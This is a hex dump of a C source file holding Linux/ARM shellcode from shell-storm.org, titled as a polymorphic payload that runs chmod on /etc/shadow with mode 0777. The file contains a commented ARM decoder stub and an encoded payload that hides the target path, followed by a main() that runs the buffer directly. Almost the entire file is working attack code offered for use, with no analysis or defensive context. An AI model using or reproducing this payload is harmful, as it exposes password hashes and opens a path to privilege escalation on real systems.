00000000  2f 2a 0a 20 7c 20 54 69  74 6c 65 3a 20 20 20 20  |/*. | Title:    |
00000010  4c 69 6e 75 78 2f 41 52  4d 20 2d 20 70 6f 6c 79  |Linux/ARM - poly|
00000020  6d 6f 72 70 68 69 63 20  63 68 6d 6f 64 28 22 2f  |morphic chmod("/|
00000030  65 74 63 2f 73 68 61 64  6f 77 22 2c 20 30 37 37  |etc/shadow", 077|
00000040  37 29 20 2d 20 38 34 20  42 79 74 65 73 0a 20 7c  |7) - 84 Bytes. ||
00000050  20 54 79 70 65 3a 20 20  20 20 20 53 68 65 6c 6c  | Type:     Shell|
00000060  63 6f 64 65 0a 20 7c 20  41 75 74 68 6f 72 3a 20  |code. | Author: |
00000070  20 20 46 6c 6f 72 69 61  6e 20 47 61 75 6c 74 69  |  Florian Gaulti|
00000080  65 72 20 3c 66 6c 6f 72  69 61 6e 2e 67 61 75 6c  |er <florian.gaul|
00000090  74 69 65 72 40 73 68 65  6c 6c 2d 73 74 6f 72 6d  |tier@shell-storm|
000000a0  2e 6f 72 67 3e 0a 20 7c  20 50 6c 61 74 66 6f 72  |.org>. | Platfor|
000000b0  6d 3a 20 4c 69 6e 75 78  20 41 52 4d 20 28 41 52  |m: Linux ARM (AR|
000000c0  4d 39 32 36 45 4a 2d 53  20 72 65 76 20 35 20 28  |M926EJ-S rev 5 (|
000000d0  76 35 31 29 29 0a 20 7c  20 5b 2b 5d 20 20 20 20  |v51)). | [+]    |
000000e0  20 20 20 68 74 74 70 3a  2f 2f 77 77 77 2e 73 68  |   http://www.sh|
000000f0  65 6c 6c 2d 73 74 6f 72  6d 2e 6f 72 67 0a 2a 2f  |ell-storm.org.*/|
00000100  0a 0a 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 64  |...#include <std|
00000110  69 6f 2e 68 3e 0a 0a 0a  63 68 61 72 20 73 68 65  |io.h>...char she|
00000120  6c 6c 63 6f 64 65 5b 5d  20 3d 0a 22 5c 78 32 34  |llcode[] =."\x24|
00000130  5c 78 36 30 5c 78 38 66  5c 78 65 32 22 20 20 20  |\x60\x8f\xe2"   |
00000140  20 20 2f 2f 61 64 64 20  72 36 2c 20 70 63 2c 20  |  //add r6, pc, |
00000150  23 33 36 0a 22 5c 78 31  36 5c 78 66 66 5c 78 32  |#36."\x16\xff\x2|
00000160  66 5c 78 65 31 22 20 20  20 20 20 2f 2f 62 78 20  |f\xe1"     //bx |
00000170  72 36 0a 22 5c 78 64 65  5c 78 34 30 5c 78 61 30  |r6."\xde\x40\xa0|
00000180  5c 78 65 33 22 20 20 20  20 20 2f 2f 6d 6f 76 20  |\xe3"     //mov |
00000190  72 34 2c 20 23 32 32 32  0a 22 5c 78 30 31 5c 78  |r4, #222."\x01\x|
000001a0  30 63 5c 78 35 34 5c 78  65 33 22 20 20 20 20 20  |0c\x54\xe3"     |
000001b0  2f 2f 63 6d 70 20 72 34  2c 20 23 32 35 36 0a 22  |//cmp r4, #256."|
000001c0  5c 78 31 65 5c 78 66 66  5c 78 32 66 5c 78 38 31  |\x1e\xff\x2f\x81|
000001d0  22 20 20 20 20 20 2f 2f  62 78 68 69 20 6c 72 0a  |"     //bxhi lr.|
000001e0  22 5c 78 64 65 5c 78 34  30 5c 78 34 34 5c 78 65  |"\xde\x40\x44\xe|
000001f0  32 22 20 20 20 20 20 2f  2f 73 75 62 20 72 34 2c  |2"     //sub r4,|
00000200  20 72 34 2c 20 23 32 32  32 0a 22 5c 78 30 34 5c  | r4, #222."\x04\|
00000210  78 35 30 5c 78 64 65 5c  78 65 37 22 20 20 20 20  |x50\xde\xe7"    |
00000220  20 2f 2f 6c 64 72 62 20  72 35 2c 20 5b 6c 72 2c  | //ldrb r5, [lr,|
00000230  20 72 34 5d 0a 22 5c 78  30 32 5c 78 35 30 5c 78  | r4]."\x02\x50\x|
00000240  38 35 5c 78 65 32 22 20  20 20 20 20 2f 2f 61 64  |85\xe2"     //ad|
00000250  64 20 72 35 2c 20 72 35  2c 20 23 32 20 28 61 64  |d r5, r5, #2 (ad|
00000260  64 20 32 20 61 74 20 65  76 65 72 79 20 73 68 65  |d 2 at every she|
00000270  6c 6c 63 6f 64 65 27 73  20 62 79 74 65 29 0a 22  |llcode's byte)."|
00000280  5c 78 30 34 5c 78 35 30  5c 78 63 65 5c 78 65 37  |\x04\x50\xce\xe7|
00000290  22 20 20 20 20 20 2f 2f  73 74 72 62 20 72 35 2c  |"     //strb r5,|
000002a0  20 5b 6c 72 2c 20 72 34  5d 0a 22 5c 78 64 66 5c  | [lr, r4]."\xdf\|
000002b0  78 34 30 5c 78 38 34 5c  78 65 32 22 20 20 20 20  |x40\x84\xe2"    |
000002c0  20 2f 2f 61 64 64 20 72  34 2c 20 72 34 2c 20 23  | //add r4, r4, #|
000002d0  32 32 33 0a 22 5c 78 66  37 5c 78 66 66 5c 78 66  |223."\xf7\xff\xf|
000002e0  66 5c 78 65 61 22 20 20  20 20 20 2f 2f 62 20 38  |f\xea"     //b 8|
000002f0  30 37 38 0a 22 5c 78 66  35 5c 78 66 66 5c 78 66  |078."\xf5\xff\xf|
00000300  66 5c 78 65 62 22 20 20  20 20 20 2f 2f 62 6c 20  |f\xeb"     //bl |
00000310  38 30 37 34 0a 2f 2f 73  68 65 6c 6c 63 6f 64 65  |8074.//shellcode|
00000320  20 63 72 79 70 74 65 64  0a 22 5c 78 66 66 5c 78  | crypted."\xff\x|
00000330  35 65 5c 78 38 64 5c 78  65 30 22 0a 22 5c 78 31  |5e\x8d\xe0"."\x1|
00000340  34 5c 78 66 64 5c 78 32  64 5c 78 64 66 22 0a 22  |4\xfd\x2d\xdf"."|
00000350  5c 78 37 36 5c 78 34 34  22 0a 22 5c 78 30 61 5c  |\x76\x44"."\x0a\|
00000360  78 32 65 22 0a 22 5c 78  66 64 5c 78 31 66 22 0a  |x2e"."\xfd\x1f".|
00000370  22 5c 78 66 64 5c 78 32  66 22 0a 22 5c 78 30 64  |"\xfd\x2f"."\x0d|
00000380  5c 78 32 35 22 0a 22 5c  78 66 66 5c 78 64 64 22  |\x25"."\xff\xdd"|
00000390  0a 22 5c 78 66 66 5c 78  32 35 22 0a 22 5c 78 66  |."\xff\x25"."\xf|
000003a0  66 5c 78 64 64 22 0a 22  2d 63 72 61 2d 71 66 5f  |f\xdd"."-cra-qf_|
000003b0  62 6d 75 22 3b 0a 0a 0a  69 6e 74 20 6d 61 69 6e  |bmu";...int main|
000003c0  28 29 0a 7b 0a 20 20 20  20 20 20 20 20 28 2a 28  |().{.        (*(|
000003d0  76 6f 69 64 28 2a 29 28  29 29 20 73 68 65 6c 6c  |void(*)()) shell|
000003e0  63 6f 64 65 29 28 29 3b  0a 0a 72 65 74 75 72 6e  |code)();..return|
000003f0  20 30 3b 0a 7d                                    | 0;.}|
000003f5
